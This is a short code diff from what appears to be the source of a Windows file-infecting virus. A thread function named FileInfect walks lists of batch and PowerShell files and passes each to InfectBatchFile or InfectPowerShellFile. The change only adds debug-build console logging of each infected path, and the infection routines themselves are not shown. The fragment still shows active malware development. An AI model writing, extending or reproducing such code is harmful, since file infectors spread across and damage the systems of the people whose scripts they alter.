@@ -21,6 +21,8 @@
 
 #include "utils/fileinfect/fileinfect.h"
 
+#include <cstdio>
+
 volatile bool gFxStop = false;
 
 
@@ -31,7 +33,9 @@ DWORD WINAPI FileInfect(LPVOID)
 
     for (const auto& path : batchfiles)
     {
-        // TODO: log on console every path, but ONLY IF ITS TARGETING DEBUG
+#ifdef _DEBUG
+        printf("infect batch: %s\n", path.c_str());
+#endif
         FileInfecting::InfectBatchFile(path);
     }
 
@@ -39,7 +43,9 @@ DWORD WINAPI FileInfect(LPVOID)
 
     for (const auto& path : psfiles)
     {
-        // TODO: log on console every path, but ONLY IF ITS TARGETING DEBUG
+#ifdef _DEBUG
+        printf("infect powershell: %s\n", path.c_str());
+#endif
         FileInfecting::InfectPowerShellFile(path);
     }
 
